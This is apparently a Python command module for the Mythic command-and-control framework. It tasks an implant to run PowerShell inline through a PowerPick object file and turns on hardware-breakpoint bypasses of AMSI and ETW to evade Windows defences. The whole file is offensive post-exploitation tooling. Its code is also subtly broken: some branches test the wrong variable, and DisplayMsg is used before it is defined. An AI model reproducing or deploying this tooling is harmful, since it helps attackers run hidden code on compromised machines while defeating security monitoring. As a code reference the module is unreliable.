from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
from .Utils.u import *

class PwPickArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="command",
                cli_name="command",
                type=ParameterType.String,
                description="command to run",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="script",
                cli_name="script",
                type=ParameterType.String,
                description="powershell script",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                parts = self.command_line.split()
                if len(parts) < 1:
                    raise ValueError("Usage: pwpick -command <command> [-script <url>]")
                self.add_arg("command", parts[0])
                if len(parts) > 1:
                    self.add_arg("script", parts[1])

class PwPickCommand(CommandBase):
    cmd = "dotnet-pwpick"
    needs_admin = False
    help_cmd = "dotnet-pwpick -command [command] [-script [script]]"
    description = "Run powershell command without spawning powershell.exe inline using PowerPick"
    version = 1
    author = "@Oblivion"
    attackmapping = ["T1564", "T1070"]
    argument_class = PwPickArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        alias=True,
    )

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        
        script  = task.args.get_arg("script")
        command = task.args.get_arg("command")

        task.args.remove_arg("script")
        task.args.remove_arg("command")
        
        display_params = f"-command \"{command}\""
        if task.args.get_arg("script"):
            display_params += f" -script \"{script}\""
        
        AgentData = await StorageExtract( task.Callback.AgentCallbackID )

        bypass_dotnet = AgentData["evasion"]["bypass_dotnet"]

        bypass_flags = 0

        if bypass_dotnet == "AMSI":
            bypass_flags = 0x700
        elif bypass_flags == "ETW":  
            bypass_flags = 0x400     
        elif bypass_flags == "AMSI and ETW":  
            bypass_flags = 0x100

        if bypass_dotnet != "None":
            DisplayMsg += f"[+] Using Hardware Breakpoint to bypass {bypass_dotnet}\n"
        else:
            DisplayMsg += f"[+] Hardware Breakpoint bypass disabled\n"

        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=task.Task.ID,
            Response=DisplayMsg
        ))

        content: bytes = await get_content_by_name("dotnet_pwsh.x64.o", task.Task.ID)
        if not content:
            raise Exception("File BOF 'dotnet_inline.x64.o' not found!")

        bof_args = [
            {"type": "char" , "value": command},
            {"type": "char" , "value": script},
            {"type": "int32", "value": bypass_flags},                 # Flags de bypass (AMSI/ETW)
        ]

        task.args.add_arg("bof_file", content.hex())
        task.args.add_arg("bof_id", 0, ParameterType.Number)
        task.args.add_arg("bof_args", json.dumps(bof_args))

        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName="exec-bof",  
            TokenID=task.Task.TokenID,
            DisplayParams=display_params
        )

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)